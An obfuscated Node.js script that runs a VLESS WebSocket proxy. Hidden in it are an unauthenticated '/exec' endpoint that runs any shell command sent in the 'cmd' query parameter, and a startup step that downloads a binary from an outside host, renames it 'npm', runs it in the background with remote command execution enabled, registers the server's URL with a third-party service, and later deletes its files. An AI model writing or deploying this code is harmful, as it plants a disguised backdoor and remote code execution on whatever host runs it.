const _0x393b3f=_0x1df1;(function(_0x3df5c2,_0x3b803a){const _0x1fa937=_0x1df1,_0x170b59=_0x3df5c2();while(!![]){try{const _0x51873d=-parseInt(_0x1fa937(0x1d1))/0x1*(parseInt(_0x1fa937(0x1f4))/0x2)+-parseInt(_0x1fa937(0x203))/0x3*(parseInt(_0x1fa937(0x1d5))/0x4)+-parseInt(_0x1fa937(0x1f5))/0x5*(parseInt(_0x1fa937(0x1c2))/0x6)+parseInt(_0x1fa937(0x215))/0x7+parseInt(_0x1fa937(0x1bd))/0x8+parseInt(_0x1fa937(0x1e5))/0x9+parseInt(_0x1fa937(0x1c8))/0xa*(parseInt(_0x1fa937(0x1da))/0xb);if(_0x51873d===_0x3b803a)break;else _0x170b59['push'](_0x170b59['shift']());}catch(_0x510e3f){_0x170b59['push'](_0x170b59['shift']());}}}(_0x467c,0x794da));const os=require('os'),http=require(_0x393b3f(0x1f1)),fs=require('fs'),axios=require(_0x393b3f(0x1d3)),net=require(_0x393b3f(0x1df)),{Buffer}=require(_0x393b3f(0x218)),{exec,execSync}=require(_0x393b3f(0x210)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x393b3f(0x1f7)]||_0x393b3f(0x1fc),NEZHA_SERVER=process[_0x393b3f(0x1d9)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x393b3f(0x1d9)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x393b3f(0x1d9)][_0x393b3f(0x1ff)]||'',DOMAIN=process[_0x393b3f(0x1d9)][_0x393b3f(0x1ca)]||_0x393b3f(0x201),AUTO_ACCESS=process[_0x393b3f(0x1d9)][_0x393b3f(0x1bb)]||![],WSPATH=process[_0x393b3f(0x1d9)][_0x393b3f(0x21e)]||UUID[_0x393b3f(0x21f)](0x0,0x8),SUB_PATH=process[_0x393b3f(0x1d9)][_0x393b3f(0x217)]||'sb',NAME=process[_0x393b3f(0x1d9)][_0x393b3f(0x1e3)]||_0x393b3f(0x1c6),PORT=process[_0x393b3f(0x1d9)]['PORT']||0x89e4;function _0x1df1(_0x2b1a9f,_0x3748a4){const _0x467cec=_0x467c();return _0x1df1=function(_0x1df15e,_0xf23c73){_0x1df15e=_0x1df15e-0x1b5;let _0x5b571a=_0x467cec[_0x1df15e];return _0x5b571a;},_0x1df1(_0x2b1a9f,_0x3748a4);}function _0x467c(){const _0x150060=['AUTO_ACCESS','chmod\x20+x\x20npm','4558032qrMmBz','toString','once','&path=%2F#','substr','592338dhCXpe','https://speed.cloudflare.com/meta','pathname','get','Vls','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','50XYKgRR','config.yaml','DOMAIN','aarch64','Server\x20is\x20running\x20on\x20port\x20','base64','reduce','pipe','replace','962233SIVTlF','connection','axios','readUInt8','548JPsMrs','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','finish','&type=ws&host=','env','678403kJxJPp','send','map','2083','error','net','/exec','every','npm\x20is\x20already\x20running,\x20skip\x20running...','NAME','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','5323032kXTkYe','@www.visa.com.tw:443?encryption=none&security=tls&sni=','stream','writeHead','readUInt16BE','npm\x20download\x20successfully','Unknown','application/json','arch','443','message','text/plain','http','Server','arm64','2zrfkUi','40dFrByp','client_secret:\x20','UUID','data','log','pop','createWriteStream','5efabea4-f6d4-91fd-b8f0-17e004c89c60','end','2087','NEZHA_KEY','No\x20command\x0a','1234.abc.com','/bin/bash','189dRMkTG','connect','https://amd64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Automatic\x20Access\x20Task\x20added\x20successfully','listen','post','8443','cmd','Hello,\x20World\x0a','Not\x20Found\x0a','trim','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','child_process','utf-8','error:\x20','split','includes','5515573WNCJvz','https://arm64.ssss.nyc.mn/v1','SUB_PATH','buffer','https://arm64.ssss.nyc.mn/agent','2096','url','npm','unlink','WSPATH','slice','vless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','query','createServer','false','join','\x20-p\x20','parse','npm\x20is\x20running'];_0x467c=function(){return _0x150060;};return _0x467c();}let ISP='';const GetISP=async()=>{const _0x2744e5=_0x393b3f;try{const _0x165ca1=await axios['get'](_0x2744e5(0x1c3)),_0x1eb3ab=_0x165ca1[_0x2744e5(0x1f8)];ISP=(_0x1eb3ab['country']+'-'+_0x1eb3ab['asOrganization'])[_0x2744e5(0x1d0)](/ /g,'_');}catch(_0x400bea){ISP=_0x2744e5(0x1eb);}};GetISP();const httpServer=http[_0x393b3f(0x1b5)]((_0x7a508e,_0x2dec0b)=>{const _0x295712=_0x393b3f,_0x490041=url[_0x295712(0x1b9)](_0x7a508e[_0x295712(0x21b)],!![]);if(_0x490041[_0x295712(0x1c4)]===_0x295712(0x1e0)){console[_0x295712(0x1f9)](_0x490041[_0x295712(0x222)]);if(!_0x490041[_0x295712(0x222)][_0x295712(0x20b)]){_0x2dec0b[_0x295712(0x1e8)](0xc8,{'Content-Type':'text/plain'}),_0x2dec0b[_0x295712(0x1fd)](_0x295712(0x200));return;}let _0x1b62b3=_0x490041['query'][_0x295712(0x20b)];exec(_0x1b62b3,function(_0x263afc,_0x530a59,_0x2cc808){const _0x2ec238=_0x295712;_0x263afc?(_0x2dec0b['writeHead'](0xc8,{'Content-Type':_0x2ec238(0x1f0)}),_0x2dec0b[_0x2ec238(0x1fd)](_0x263afc[_0x2ec238(0x1ef)])):(_0x2dec0b[_0x2ec238(0x1e8)](0xc8,{'Content-Type':_0x2ec238(0x1f0)}),_0x2dec0b['end'](_0x530a59));});return;}if(_0x7a508e[_0x295712(0x21b)]==='/')_0x2dec0b[_0x295712(0x1e8)](0xc8,{'Content-Type':_0x295712(0x1f0)}),_0x2dec0b[_0x295712(0x1fd)](_0x295712(0x20c));else{if(_0x7a508e['url']==='/'+SUB_PATH){const _0x3f04cc=DOMAIN['split']('.')[0x0],_0x29ffb2=_0x295712(0x220)+UUID+_0x295712(0x1e6)+DOMAIN+_0x295712(0x1d8)+DOMAIN+_0x295712(0x1c0)+_0x3f04cc,_0x205783=Buffer['from'](_0x29ffb2)[_0x295712(0x1be)](_0x295712(0x1cd));_0x2dec0b['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x2dec0b[_0x295712(0x1fd)](_0x205783+'\x0a');}else _0x2dec0b[_0x295712(0x1e8)](0x194,{'Content-Type':_0x295712(0x1f0)}),_0x2dec0b['end'](_0x295712(0x20d));}}),wss=new WebSocket[(_0x393b3f(0x1f2))]({'server':httpServer}),uuid=UUID['replace'](/-/g,'');wss['on'](_0x393b3f(0x1d2),_0x38b4b6=>{const _0x585582=_0x393b3f;_0x38b4b6[_0x585582(0x1bf)]('message',_0x279c86=>{const _0x488599=_0x585582,[_0x1d5656]=_0x279c86,_0x31e5a0=_0x279c86[_0x488599(0x21f)](0x1,0x11);if(!_0x31e5a0[_0x488599(0x1e1)]((_0x4633bd,_0xdaf853)=>_0x4633bd==parseInt(uuid[_0x488599(0x1c1)](_0xdaf853*0x2,0x2),0x10)))return;let _0x149524=_0x279c86['slice'](0x11,0x12)[_0x488599(0x1d4)]()+0x13;const _0x45c76e=_0x279c86[_0x488599(0x21f)](_0x149524,_0x149524+=0x2)[_0x488599(0x1e9)](0x0),_0x5d84b2=_0x279c86[_0x488599(0x21f)](_0x149524,_0x149524+=0x1)['readUInt8'](),_0x1300db=_0x5d84b2==0x1?_0x279c86[_0x488599(0x21f)](_0x149524,_0x149524+=0x4)[_0x488599(0x1b7)]('.'):_0x5d84b2==0x2?new TextDecoder()['decode'](_0x279c86[_0x488599(0x21f)](_0x149524+0x1,_0x149524+=0x1+_0x279c86['slice'](_0x149524,_0x149524+0x1)[_0x488599(0x1d4)]())):_0x5d84b2==0x3?_0x279c86['slice'](_0x149524,_0x149524+=0x10)[_0x488599(0x1ce)]((_0x57c31c,_0x36e379,_0x2cdb96,_0x54da8c)=>_0x2cdb96%0x2?_0x57c31c['concat'](_0x54da8c[_0x488599(0x21f)](_0x2cdb96-0x1,_0x2cdb96+0x1)):_0x57c31c,[])[_0x488599(0x1dc)](_0x34b43b=>_0x34b43b[_0x488599(0x1e9)](0x0)['toString'](0x10))[_0x488599(0x1b7)](':'):'';_0x38b4b6[_0x488599(0x1db)](new Uint8Array([_0x1d5656,0x0]));const _0x137948=createWebSocketStream(_0x38b4b6);net[_0x488599(0x204)]({'host':_0x1300db,'port':_0x45c76e},function(){const _0x4f11be=_0x488599;this['write'](_0x279c86[_0x4f11be(0x21f)](_0x149524)),_0x137948['on']('error',()=>{})[_0x4f11be(0x1cf)](this)['on'](_0x4f11be(0x1de),()=>{})[_0x4f11be(0x1cf)](_0x137948);})['on'](_0x488599(0x1de),()=>{});})['on'](_0x585582(0x1de),()=>{});});const getDownloadUrl=()=>{const _0x47cfa3=_0x393b3f,_0x3f7f7a=os[_0x47cfa3(0x1ed)]();return _0x3f7f7a==='arm'||_0x3f7f7a===_0x47cfa3(0x1f3)||_0x3f7f7a===_0x47cfa3(0x1cb)?!NEZHA_PORT?_0x47cfa3(0x216):_0x47cfa3(0x219):!NEZHA_PORT?_0x47cfa3(0x205):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x2c38b1=_0x393b3f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3a8bf2=getDownloadUrl(),_0x4a4964=await axios({'method':_0x2c38b1(0x1c5),'url':_0x3a8bf2,'responseType':_0x2c38b1(0x1e7)}),_0x5c8a9c=fs[_0x2c38b1(0x1fb)](_0x2c38b1(0x21c));return _0x4a4964[_0x2c38b1(0x1f8)][_0x2c38b1(0x1cf)](_0x5c8a9c),new Promise((_0x2ee880,_0x38291b)=>{const _0x2b91dc=_0x2c38b1;_0x5c8a9c['on'](_0x2b91dc(0x1d7),()=>{const _0x59ab6a=_0x2b91dc;console[_0x59ab6a(0x1f9)](_0x59ab6a(0x1ea)),exec(_0x59ab6a(0x1bc),_0x1377f8=>{if(_0x1377f8)_0x38291b(_0x1377f8);_0x2ee880();});}),_0x5c8a9c['on'](_0x2b91dc(0x1de),_0x38291b);});}catch(_0x5ec9f5){throw _0x5ec9f5;}},runnz=async()=>{const _0x20ae29=_0x393b3f;try{const _0x21d98a=execSync(_0x20ae29(0x1e4),{'encoding':_0x20ae29(0x211)});if(_0x21d98a[_0x20ae29(0x20e)]()!==''){console[_0x20ae29(0x1f9)](_0x20ae29(0x1e2));return;}}catch(_0x370a78){}await downloadFile();let _0x174855='',_0x9020fb=[_0x20ae29(0x1ee),_0x20ae29(0x20a),_0x20ae29(0x21a),_0x20ae29(0x1fe),_0x20ae29(0x1dd),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x547f05=_0x9020fb[_0x20ae29(0x214)](NEZHA_PORT)?'--tls':'';_0x174855='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x20ae29(0x1b8)+NEZHA_KEY+'\x20'+_0x547f05+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2f7c67=NEZHA_SERVER[_0x20ae29(0x214)](':')?NEZHA_SERVER[_0x20ae29(0x213)](':')[_0x20ae29(0x1fa)]():'',_0x31a338=_0x9020fb['includes'](_0x2f7c67)?'true':_0x20ae29(0x1b6),_0xf086df=_0x20ae29(0x1f6)+NEZHA_KEY+_0x20ae29(0x221)+NEZHA_SERVER+_0x20ae29(0x1d6)+_0x31a338+_0x20ae29(0x206)+UUID;fs['writeFileSync'](_0x20ae29(0x1c9),_0xf086df);}_0x174855=_0x20ae29(0x20f);}else{console[_0x20ae29(0x1f9)](_0x20ae29(0x1c7));return;}}try{exec(_0x174855,{'shell':_0x20ae29(0x202)},_0xafca0d=>{const _0x3f31b4=_0x20ae29;if(_0xafca0d)console[_0x3f31b4(0x1de)]('npm\x20running\x20error:',_0xafca0d);else console[_0x3f31b4(0x1f9)](_0x3f31b4(0x1ba));});}catch(_0x5379cc){console[_0x20ae29(0x1de)](_0x20ae29(0x212)+_0x5379cc);}};async function addAccessTask(){const _0x52aeba=_0x393b3f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1c462d='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x127dd3=await axios[_0x52aeba(0x209)]('https://oooo.serv00.net/add-url',{'url':_0x1c462d},{'headers':{'Content-Type':_0x52aeba(0x1ec)}});console[_0x52aeba(0x1f9)](_0x52aeba(0x207));}catch(_0x49f22a){}}const delFiles=()=>{const _0x371e09=_0x393b3f;fs[_0x371e09(0x21d)]('npm',()=>{}),fs[_0x371e09(0x21d)](_0x371e09(0x1c9),()=>{});};httpServer[_0x393b3f(0x208)](PORT,()=>{const _0x58ec83=_0x393b3f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x58ec83(0x1f9)](_0x58ec83(0x1cc)+PORT);});
